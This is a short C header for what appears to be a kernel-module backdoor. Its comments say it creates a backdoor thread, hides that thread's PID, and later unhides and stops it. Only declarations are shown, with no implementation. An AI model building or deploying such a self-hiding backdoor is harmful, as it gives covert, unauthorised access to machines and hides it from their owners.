#ifndef _BACKDOOR_H
#define _BACKDOOR_H

// Creates the backdoor thread, hides its PID and starts it
int __init backdoor_init(void);

// Unhides the PID of the backdoor thread and stops it
void backdoor_exit(void);

#endif
